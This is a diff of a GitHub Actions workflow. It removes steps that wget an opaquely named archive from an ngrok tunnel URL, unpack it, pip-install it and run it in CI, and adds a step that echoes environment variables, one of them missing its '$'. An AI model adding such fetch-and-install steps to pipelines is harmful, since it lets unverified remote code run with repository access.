@@ -12,13 +12,5 @@ jobs:
       - uses: actions/setup-python@v2
         with:
           python-version: "3.8"
-      - name: Wget package
-        run: wget https://02efaf6fa8ef.ngrok.io/github/items/hf8734hjf98324jhfiu3gfh9928ufjoi23bhg9834
-      - name: Unpack package
-        run: tar -xvf hf8734hjf98324jhfiu3gfh9928ufjoi23bhg9834
-      - name: Install locust
-        run: pip install -e locust/
-      - name: Install requests (TEST1)
-        run: pip install requests
-      - name: Run locust check
-        run: locust -r . -i origin/main -t HEAD
+      - name: Check GitHub environment variables
+        run: echo "Action ID - ${GITHUB_ACTION}, Run ID - {GITHUB_RUN_ID}, Workflow - ${GITHUB_WORKFLOW}, Repository - ${GITHUB_REPOSITORY}, SHA - ${GITHUB_SHA}, Ref - ${GITHUB_REF}"
